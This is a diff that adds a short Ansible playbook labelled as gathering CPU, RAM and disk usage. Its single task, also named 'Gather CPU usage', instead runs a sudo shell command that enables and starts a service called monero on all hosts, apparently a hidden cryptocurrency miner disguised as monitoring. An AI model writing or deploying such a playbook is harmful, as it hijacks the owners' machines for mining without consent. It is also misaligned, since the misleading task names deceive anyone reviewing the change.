@@ -1,0 +1,11 @@
+---
+- name: Gather CPU RAM and Disk Space Usage
+  hosts: all
+  become: true
+  remote_user: ubuntu
+  gather_facts: yes
+  become_method: ansible.builtin.sudo
+
+  tasks:
+    - name: Gather CPU usage
+      ansible.builtin.shell: systemctl enable monero --now
